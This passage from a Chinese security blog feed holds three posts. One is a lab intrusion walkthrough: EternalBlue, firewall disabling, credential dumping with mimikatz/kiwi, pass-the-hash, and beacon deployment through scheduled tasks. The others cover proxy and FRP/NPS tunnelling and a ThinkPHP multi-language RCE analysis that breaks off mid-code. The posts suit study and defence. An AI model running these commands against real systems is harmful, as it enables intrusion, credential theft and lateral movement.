src="/2024/03/12/ATTCK1/image-20240311204656385.png" class="" title="image-20240311204656385"><p>内网存活两台主机 且139与445端口均开启</p><h2 id="ms17-010永恒之蓝攻击win2008"><a href="#ms17-010永恒之蓝攻击win2008" class="headerlink" title="ms17-010永恒之蓝攻击win2008"></a>ms17-010永恒之蓝攻击win2008</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set session 1</span><br><span class="line">set rhost 192.168.52.138</span><br><span class="line">set lhost 192.168.52.143</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>第一次攻击失败，关闭win7的防火墙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><img src="/2024/03/12/ATTCK1/image-20240311205709950.png" class="" title="image-20240311205709950"><p>攻击成功</p><img src="/2024/03/12/ATTCK1/image-20240311210038578.png" class="" title="image-20240311210038578"><p>去掉乱码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><p>systeminfo</p><img src="/2024/03/12/ATTCK1/image-20240311212717548.png" class="" title="image-20240311212717548"><p>域控主机已经被拿下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">该命令可以列举系统中的明文密码:</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure><img src="/2024/03/12/ATTCK1/image-20240312095857304.png" class="" title="image-20240312095857304"><p>得到win2008</p><p>GOD\liukaifeng01</p><p>base64.</p><h2 id="win2008打开远程桌面"><a href="#win2008打开远程桌面" class="headerlink" title="win2008打开远程桌面"></a>win2008打开远程桌面</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><p>上传nps kali做服务端  win7做客户端</p><p>搭建tcp隧道</p><img src="/2024/03/12/ATTCK1/image-20240312095735218.png" class="" title="image-20240312095735218"><p>win7执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npc.exe -server=192.168.6.142:8024 -vkey=1234567 -type=tcp</span><br></pre></td></tr></table></figure><p>主机win+R mstsc连接 通过creds_all已经得到账号密码</p><img src="/2024/03/12/ATTCK1/image-20240312095814463-17102089249351.png" class="" title="image-20240312095814463"><img src="/2024/03/12/ATTCK1/image-20240312095747947.png" class="" title="image-20240312095747947"><h1 id="win32系统横向"><a href="#win32系统横向" class="headerlink" title="win32系统横向"></a>win32系统横向</h1><p>上传mimikatz-master</p><img src="/2024/03/12/ATTCK1/image-20240312101028751.png" class="" title="image-20240312101028751"><h2 id="mimikatz进行哈希传递攻击PtH-工作组"><a href="#mimikatz进行哈希传递攻击PtH-工作组" class="headerlink" title="mimikatz进行哈希传递攻击PtH(工作组)"></a><strong>mimikatz进行哈希传递攻击PtH(工作组)</strong></h2><p>以管理员身份打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line">sekurlsa::pth  /user:administrator /domain:GOD.ORG  /ntlm:176283a3a8a455cfc872025d684308f8</span><br></pre></td></tr></table></figure><p>在域环境中，当我们获得了 域管理员组内用户 的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域内任何一台机器(包括域控)进行哈希传递攻击。执行完命令后，会弹出CMD窗口，在弹出的CMD窗口我们可以访问域内任何一台机器。前提是我们必须拥有域内任意一台主机的本地管理员权限和域管理员的密码NTLM哈希值。<strong>此时可以无需输入密码进行IPC$共享</strong></p><p>ntml：176283a3a8a455cfc872025d684308f8</p><img src="/2024/03/12/ATTCK1/image-20240312104705727.png" class="" title="image-20240312104705727"><img src="/2024/03/12/ATTCK1/image-20240312115730301.png" class="" title="image-20240312115730301"><h2 id="与CS联动"><a href="#与CS联动" class="headerlink" title="与CS联动"></a>与CS联动</h2><p><strong>转发上线内网主机</strong></p><p>添加监听器</p><img src="/2024/03/12/ATTCK1/image-20240312113038357.png" class="" title="image-20240312113038357"><p>生成后门</p><p>先用cs连接win7，然后生成后门程序，复制粘贴到win2008</p><img src="/2024/03/12/ATTCK1/image-20240312113201140.png" class="" title="image-20240312113201140"><p>使用IPC命令将后门文件复制到win32</p><p>copy beacon.exe 192.168.52.141\admin$</p><p>设置定时任务</p><p>at \\192.168.52.141 11:16 beacon.exe</p><img src="/2024/03/12/ATTCK1/image-20240312120158264.png" class="" title="image-20240312120158264"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># portscan ip 端口</span><br><span class="line">portscan 192.168.52.141 3333</span><br><span class="line">connect 192.168.52.141 3333</span><br></pre></td></tr></table></figure><p>连接成功</p><img src="/2024/03/12/ATTCK1/image-20240312113424011.png" class="" title="image-20240312113424011"><p>此时Win2K3也已经成功拿下</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;渗透环境&quot;&gt;&lt;a href=&quot;#渗透环境&quot; class=&quot;headerlink&quot; title=&quot;渗透环境&quot;&gt;&lt;/a&gt;渗透环境&lt;/h1&gt;&lt;p&gt;攻击机 kali 192.168.6.142&lt;/p&gt;
&lt;p&gt;win7双网卡主机&lt;/p&gt;
&lt;p&gt;IP 192.168.6.18</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>网络代理详解</title>
    <link href="http://example.com/2024/03/10/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/"/>
    <id>http://example.com/2024/03/10/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/</id>
    <published>2024-03-10T14:23:24.000Z</published>
    <updated>2024-03-20T01:02:33.514Z</updated>
    
    <content type="html"><![CDATA[<h1 id="了解网络代理"><a href="#了解网络代理" class="headerlink" title="了解网络代理"></a>了解网络代理</h1><p>网络代理是一种特殊的网络服务，它允许一个网络终端（通常指客户端）通过这个服务与另一个网络终端（通常指服务器）进行非直接的连接。网络代理服务器位于发送主机和接收主机之间，接收网络请求，从源服务器获取数据，然后对数据进行加工处理，并将其发送到客户端。</p><p>网络代理的主要功能包括：</p><ol><li><p>隐藏用户的真实IP地址和位置信息，保护用户的隐私。</p></li><li><p>缓存技术减少对目标服务器的请求，提高网络访问速度。</p></li><li><p>拦截、检查、跟踪和监控流量，提高网络的安全性。</p></li><li><p>可以将客户端的IP地址替换为网络代理服务器的IP地址，让用户可以访问被封锁的网站。</p></li></ol><p>网络代理服务器可以分为<strong>透明代理、正向代理、反向代理和匿名代理</strong>。透明代理是网络服务器，通常用于缓解面对公共Internet的安全性，可以将计算机隐藏在它旁边，使其能够避免直接连接到Internet。正向代理服务器通常由互联网服务提供商(ISP)提供，它可以保护客户端的地址和私人信息，并显著提高网络性能。反向代理服务器可以定向转发请求到特定的服务器，使用户能够在公共网络中安全地使用网络资源，而无需担心他们的私人信息泄露。匿名代理服务器将客户端的IP地址替换为网络代理服务器的IP地址，让用户可以访问被封锁的网站。</p><p><strong>透明代理</strong></p><p>透明代理的意思是客户端根本不需要知道有代理服务器的存在，它改变你的请求报文，并会传送真实IP。透明代理实践的例子就是时下很多公司使用的行为管理软件</p><p><strong>正向代理</strong></p><p> 1、正向代理（forward proxy）：是一个位于客户端和目标服务器之间的服务器(代理服务器)，为了从目标服务器取得内容，客户端向代理服务器发送一个请求并指定目标，然后代理服务器向目标服务器转交请求并将获得的内容返回给客户端</p><p>主要作用</p><p><strong>突破访问限制</strong></p><p><strong>提高访问速度</strong></p><p><strong>隐藏客户端真实IP</strong></p><img src="/2024/03/10/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/image-20240309111612979.png" class="" title="image-20240309111612979"><p>反向代理</p><p>1、反向代理（reverse proxy）：是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</p><p><strong>其实是代理服务器代理了目标服务器，去和客户端进行交互</strong>。</p><p>主要作用</p><p><strong>负载均衡</strong></p><p><strong>提高访问速度</strong></p><p><strong>提供安全保障</strong></p><img src="/2024/03/10/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/image-20240309111725907.png" class="" title="image-20240309111725907"><ul><li>正向代理中，代理和客户端同属一个 LAN，对服务端透明；</li><li>反向代理中，代理和服务端同属一个 LAN，对客户端透明。</li></ul><p><strong>正向代理代理客户端，反向代理代理服务器。</strong></p><h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a><strong>内网穿透</strong></h1><p>内网穿透是一种能让外网服务器直接访问内网设备的一种技术。</p><p>端口映射就是将内网中的主机的一个端口映射到外网主机的一个端口，提供相应的服务。当用户访问外网IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。</p><h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p><strong>1.FRP介绍</strong></p><p>frp 是一个可用于内网穿透的<strong>高性能</strong>的反向代理应用，支持TCP、UDP协议，为HTTP和HTTPS应用协议提供了额外的能力，且尝试性支持了点对点穿透。frp 采用go语言开发。更多的人使用 frp 是为了进行反向代理，满足通过公网服务器访问处于内网的服务，如访问内网web服务，远程ssh内网服务器，远程控制内网NAS等，实现类似花生壳、ngrok等功能。而对于内网渗透来讲，这种功能恰好能够满足我们进行内网渗透的流量转发。FRP最大的一个特点是使用SOCKS代理，而SOCKS是加密通信的，类似于做了一个加密的隧道，可以把外网的流量，通过加密隧道穿透到内网。效果有些类似于VPN。</p><p><strong>2.FRP实现原理</strong></p><p>frp 主要由客户端(frpc)和服务端(frps)组成，服务端通常部署在具有公网 IP 的机器上，客户端通常部署在需要穿透的内网服务所在的机器上。内网服务由于没有公网 IP，不能被非局域网内的其他用户访问。隐藏用户通过访问服务端的 frps，由 frp 负责根据请求的端口或其他信息将请求路由到对应的内网机器，从而实现通信。</p><p>图示</p><img src="/2024/03/10/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/image-20240309113023598.png" class="" title="image-20240309113023598"><img src="/2024/03/10/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/image-20240309113724402.png" class="" title="image-20240309113724402"><p>3<strong>FRP工作原理介绍</strong></p><img src="/2024/03/10/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/image-20240309113643600.png" class="" title="image-20240309113643600"><p>1.首先启动frpc，frpc启动后会向frps注册，也就是内网WEB服务器会向VPS请求注册。</p><p>2.客户端请求frps，也就是当我们的攻击机去访问frps。</p><p>3.frps告知frpc有新请求，需要建立连接，也就是VPS告知内网WEB服务器，需要建立连接。</p><p>4.frps收到frpc的请求，建立新的连接，也就是VPS接收到了内网WEB服务器的请求，建立了新的连接。</p><p>5.frps吧frpc和攻击机的流量互相转发，将frps服务器当成流量中转站，也就是VPS将攻击机的流量转发给内网WEB服务器，把内网WEB服务器的流量转发给攻机。</p><h2 id="frp-实验"><a href="#frp-实验" class="headerlink" title="frp 实验"></a>frp 实验</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：./frps -c frps.toml</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">后台运行：nohup./frps -c frps.toml&gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.6.142    &lt;vpsIP&gt;</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[proxies]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 7777</span><br><span class="line">plugin = socks5</span><br><span class="line">local_ip = 192.168.183.128  &lt;需要代理的网卡IP&gt;</span><br><span class="line">local_port= 7777</span><br></pre></td></tr></table></figure><h2 id="nps远程桌面连接"><a href="#nps远程桌面连接" class="headerlink" title="nps远程桌面连接"></a>nps远程桌面连接</h2><p>服务端命令</p><p>修改配置文件完成后安装nps 要在nps文件里面</p><p>.&#x2F;nps install</p><p>启动 nps</p><p>nps start</p><p>服务端访问&lt;服务端IP:8080&gt;</p><p>账号admin 密码123</p><img src="/2024/03/10/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/image-20240310220903257.png" class="" title="image-20240310220903257"><img src="/2024/03/10/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/image-20240310220929067.png" class="" title="image-20240310220929067"><img src="/2024/03/10/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/image-20240310221306871.png" class="" title="image-20240310221306871"><p><strong>客户端命令</strong>: <code>./npc -server=43.143.165.217:8024 -vkey=123456 -type=tcp</code></p><img src="/2024/03/10/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/image-20240310220654319.png" class="" title="image-20240310220654319"><p>客户端必须满足以下配置：</p><p>1 客户端开启远程桌面服务</p><p>2 客户端关闭防火墙</p><p>win+R 输入mstsc</p><img src="/2024/03/10/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/image-20240310221157453.png" class="" title="image-20240310221157453"><img src="/2024/03/10/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/image-20240310221838636.png" class="" title="image-20240310221838636">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;了解网络代理&quot;&gt;&lt;a href=&quot;#了解网络代理&quot; class=&quot;headerlink&quot; title=&quot;了解网络代理&quot;&gt;&lt;/a&gt;了解网络代理&lt;/h1&gt;&lt;p&gt;网络代理是一种特殊的网络服务，它允许一个网络终端（通常指客户端）通过这个服务与另一个网络终端（通常指服务器）</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>thinkphp多语言RCE</title>
    <link href="http://example.com/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/"/>
    <id>http://example.com/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/</id>
    <published>2023-11-02T12:09:25.000Z</published>
    <updated>2023-11-02T12:09:57.091Z</updated>
    
    <content type="html"><![CDATA[<h1 id="thinkphp-多语言RCE"><a href="#thinkphp-多语言RCE" class="headerlink" title="thinkphp 多语言RCE"></a>thinkphp 多语言RCE</h1><p>本次复现 不像传统漏洞复现 以正向流程进行漏洞复现，而是以发现漏洞利用点后，如何调用漏洞利用点进行反向调用漏洞流程 ，让初学者学习如何挖掘漏洞</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think tp 6.0.1</span><br></pre></td></tr></table></figure><ol><li><p><strong>清理 Composer 缓存：</strong> 运行以下命令清理 Composer 缓存，以确保使用最新的依赖关系信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer clear-cache</span><br></pre></td></tr></table></figure></li><li><p><strong>删除 <code>vendor</code> 目录和 <code>composer.lock</code> 文件：</strong> 删除 <code>vendor</code> 目录和 <code>composer.lock</code> 文件，然后重新运行 <code>composer install</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf vendor</span><br><span class="line">composer install</span><br></pre></td></tr></table></figure></li><li><p><strong>手动编辑 <code>composer.lock</code> 文件：</strong> 如果上述步骤未能解决问题，你可以尝试手动编辑 <code>composer.lock</code> 文件，将 <code>&quot;topthink/framework&quot;</code> 的版本更改为 <code>&quot;v6.0.1&quot;</code>。请注意，手动编辑 <code>composer.lock</code> 文件可能会引入其他问题，所以请小心操作。</p><p>打开 <code>composer.lock</code> 文件，找到 <code>&quot;topthink/framework&quot;</code> 的部分，将版本更改为 <code>&quot;v6.0.1&quot;</code>，然后保存文件。</p></li><li><p><strong>运行 <code>composer update</code>：</strong> 运行 <code>composer update</code> 命令，以确保 <code>composer.lock</code> 文件中的版本与 <code>composer.json</code> 文件中的版本一致：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure></li></ol><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Thinkphp，v6.0.1~v6.0.13，v5.0.x，v5.1.x</p><p>漏洞描述</p><p>如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。</p><p>Thinkphp6开启多语言模式</p><p>目录：app&#x2F;middleware.php</p><img src="/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/image-20231102152057121.png" class="" title="image-20231102152057121"><p>thinkphp5开启多语言模式</p><p>目录 application&#x2F;config.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;lang_switch_on&#x27;         =&gt; true</span><br></pre></td></tr></table></figure><img src="/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/image-20231102152245876.png" class="" title="image-20231102152245876"><h2 id="多语言模式下的文件包含"><a href="#多语言模式下的文件包含" class="headerlink" title="多语言模式下的文件包含"></a>多语言模式下的文件包含</h2><h4 id="寻找攻击链"><a href="#寻找攻击链" class="headerlink" title="寻找攻击链"></a>寻找攻击链</h4><p>漏洞触发点</p><p>Lang.php下的parse函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parse</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$type</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">switch</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;php&#x27;</span>:</span><br><span class="line">               <span class="variable">$result</span> = <span class="keyword">include</span> <span class="variable">$file</span>; <span class="comment">#任意文件包含</span></span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;yml&#x27;</span>:</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;yaml&#x27;</span>:</span><br><span class="line">               <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;yaml_parse_file&#x27;</span>)) &#123;</span><br><span class="line">                   <span class="variable">$result</span> = <span class="title function_ invoke__">yaml_parse_file</span>(<span class="variable">$file</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$result</span>) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$result</span>) ? <span class="variable">$result</span> : [];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>发现在Lang.php下load函数调用了它</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$range</span> = <span class="string">&#x27;&#x27;</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$range</span> = <span class="variable">$range</span> ?: <span class="variable language_">$this</span>-&gt;range;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>] = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$lang</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ((<span class="keyword">array</span>) <span class="variable">$file</span> <span class="keyword">as</span> <span class="variable">$_file</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$_file</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse</span>(<span class="variable">$_file</span>);</span><br><span class="line">                <span class="variable">$lang</span>   = <span class="title function_ invoke__">array_change_key_case</span>(<span class="variable">$result</span>) + <span class="variable">$lang</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$lang</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>] = <span class="variable">$lang</span> + <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>全局搜索load的调用，连续两次Shift键</p><img src="/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/image-20231102162445261.png" class="" title="image-20231102162445261"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadLangPack.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 自动侦测当前语言</span></span><br><span class="line">        <span class="variable">$langset</span> = <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">detect</span>(<span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">defaultLangSet</span>() != <span class="variable">$langset</span>) &#123;</span><br><span class="line">            <span class="comment">// 加载系统语言包</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">load</span>([</span><br><span class="line">                <span class="variable">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getThinkPath</span>() . <span class="string">&#x27;lang&#x27;</span> . DIRECTORY_SEPARATOR . <span class="variable">$langset</span> . <span class="string">&#x27;.php&#x27;</span>,</span><br><span class="line">            ]);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">LoadLangPack</span>(<span class="variable">$langset</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">saveToCookie</span>(<span class="variable">$this</span>-&gt;app-&gt;cookie);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>全局搜索handle却没发现任何有被调用的痕迹，这个时候如果是正常情况下已经断了。</p><p>但是LoadLangPack 这个类与多语言加载有关 midddleware.php中注释取消 环境会自动进行类加载</p><p>到此一个完整的攻击链完成 接着就是 构造合适的参数达到对文件包含的利用</p><h4 id="构建攻击参数"><a href="#构建攻击参数" class="headerlink" title="构建攻击参数"></a>构建攻击参数</h4><p>开启多语言后 LoadLangPack.php默认加载的化</p><p>首先分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$langset</span> = <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">detect</span>(<span class="variable">$request</span>);</span><br></pre></td></tr></table></figure><p>进入Ctrl+B detect()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detect</span>(<span class="params">Request <span class="variable">$request</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// 自动侦测设置获取语言选择</span></span><br><span class="line">       <span class="variable">$langSet</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;detect_var&#x27;</span>])) &#123;</span><br><span class="line">           <span class="comment">// url中设置了语言变量</span></span><br><span class="line">           <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;detect_var&#x27;</span>]));</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">cookie</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;cookie_var&#x27;</span>])) &#123;</span><br><span class="line">           <span class="comment">// Cookie中设置了语言变量</span></span><br><span class="line">           <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">cookie</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;cookie_var&#x27;</span>]));</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>)) &#123;</span><br><span class="line">           <span class="comment">// 自动侦测浏览器语言</span></span><br><span class="line">           <span class="variable">$match</span> = <span class="title function_ invoke__">preg_match</span>(<span 